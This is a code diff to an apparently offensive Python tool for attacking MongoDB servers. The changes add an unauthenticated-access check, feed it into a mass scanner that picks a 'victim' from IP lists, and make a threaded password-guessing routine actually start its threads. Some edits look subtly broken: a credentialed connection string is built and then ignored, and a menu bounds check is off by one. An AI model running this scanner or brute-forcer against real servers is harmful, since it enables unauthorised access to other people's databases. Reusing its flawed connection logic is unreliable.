@@ -48,6 +48,9 @@ global httpMethod
 global myIP
 global myPort
 global verb
+global scanNeedCreds
+global dbPort
+dbPort = 27017
 
 def mainMenu():
 	mmSelect = True
@@ -142,9 +145,7 @@ def options():
 		myPort = "Not Set"
 	if optionSet[6] == False:
 		verb = "OFF"
-	if optionSet[7] == False:
-		dbPort = 27017
-	optSelect = True
+		optSelect = True
 	
 	while optSelect:	
 		print "\n\n"
@@ -377,30 +378,37 @@ def netAttacks(target):
 	global dbPort
 	dbList = []
 	
-	srvNeedCreds = raw_input("Does the database server need credentials (y/n)? ")
+	print "Checking to see if credentials are needed..."
+	needCreds = accessCheck(target,dbPort)
 	
-	if srvNeedCreds in no_tag:
-		
-		try:
-			conn = pymongo.MongoClient(target,dbPort)
-			print "MongoDB port open on " + target + ":" + str(dbPort)
-			mgtOpen = True
+	if needCreds == 0:
+		conn = pymongo.MongoClient(target,dbPort)
+		print "Successful access with no credentials!"
+		mgtOpen = True
 	
-		except:
-			print "MongoDB port closed."					
-	
-	elif srvNeedCreds in yes_tag:
+	elif needCreds == 1:
+		print "Login required!"
 		srvUser = raw_input("Enter server username: ")
 		srvPass = raw_input("Enter server password: ")
-		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"
-
+		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"
+		
 		try:
-			conn = pymongo.MongoClient(uri)
+			conn = pymongo.MongoClient(target)
 			print "MongoDB authenticated on " + target + ":27017!"
 			mgtOpen = True
 		except:
+			print str(sys.exc_info())
 			raw_input("Failed to authenticate.  Press enter to continue...")
 			return
+	
+	elif needCreds == 2:
+		conn = pymongo.MongoClient(target,dbPort)
+		print "Access check failure.  Testing will continue but will be unreliable."
+		mgtOpen = True
+	
+	elif needCreds == 3:
+		print "Couldn't connect to Mongo server."
+		return
 	
 	
 	mgtUrl = "http://" + target + ":28017"	
@@ -1327,11 +1335,34 @@ def stealDBs(myDB):
 			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
 			return
 	
+def accessCheck(ip,port):
+	try:
+		conn = pymongo.MongoClient(ip,port)
+		
+		try:
+			dbList = conn.database_names()
+			conn.disconnect()
+			return 0
+		
+		except:
+			if str(sys.exc_info()).find('need to login') != -1:
+				conn.disconnect()
+				return 1
+			
+			else:
+				conn.disconnect()
+				return 2
+
+	except:
+		return 3
+			
+		
 def massMongo():
 	global victim
 	optCheck = True
 	loadCheck = False
 	success = []
+	creds = []
 	ipList = []
 	print "\n"
 	print "MongoDB Default Access Scanner"
@@ -1372,22 +1403,29 @@ def massMongo():
 
 	print "\n"
 	for target in ipList:
-	        try:
-	                conn = pymongo.MongoClient(target,27017)
-			print "Connected to " + target
-			dbList = conn.database_names()
+		result = accessCheck(target,27017)
 			
-			print "Successful default access on " + target
+		if result == 0:
+			print "Successful default access on " + target + "."
 			success.append(target)
-			conn.disconnect()
+			
+		elif result == 1:
+			print "MongoDB running but credentials required on " + target + "."
+			success.append(target)
+			
+		elif result == 2:
+			print "Successful MongoDB connection but error executing command."
+			success.append(target)
+		
+		elif result == 3:
+			print "Couldn't connect to " + target + "."
 
-		except:
-		        print "Failed to connect to or need credentials for " + target 
 
 	print "\n\n"
 	print "Discovered MongoDB Servers:"
 	
 	menuItem = 1
+	
 	for server in success:
 		print str(menuItem) + "-" + server
 		menuItem += 1
@@ -1400,7 +1438,7 @@ def massMongo():
 		if select == "x" or select == "X":
 			return
 	
-		elif select.isdigit() == True:
+		elif select.isdigit() == True and int(select) <= menuItem:
 			victim = success[int(select) - 1]
 			optionSet[0] = True
 			raw_input("New target set! Press enter to return to the main menu.")
@@ -1429,6 +1467,7 @@ def dict_pass(user,key):
 	for passGuess in passList:
 		temp = passGuess.split("\n")[0]
 		t = Thread(target=gen_pass, args = (user, temp, key))
+		t.start()
 	return
 
 def genBrute(chars, maxLen):
